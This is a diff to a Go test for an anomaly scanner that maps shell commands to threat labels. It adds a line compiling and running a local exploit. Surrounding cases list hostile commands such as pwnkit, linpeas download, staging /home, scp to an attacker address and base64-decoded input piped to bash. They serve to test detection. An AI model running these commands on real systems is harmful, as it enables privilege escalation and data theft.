@@ -218,6 +218,7 @@ func TestScanAnomaliesCatalog(t *testing.T) {
 		{"aws sts get-caller-identity", "shell-cloud-cred-theft"},
 		{"./pwnkit", "shell-local-exploit"},
 		{"wget http://x/linpeas.sh", "shell-local-exploit"},
+		{"gcc fragnesia.c -o f && ./f", "shell-local-exploit"}, // CVE-2026-46300
 		{"tar czf /tmp/loot.tar.gz /home", "shell-data-staged"},
 		{"scp /tmp/loot.tar.gz attacker@1.2.3.4:/x", "shell-exfil-channel"},
 		{"echo aGVsbG8= | base64 -d | bash", "shell-decode-pipe-exec"},
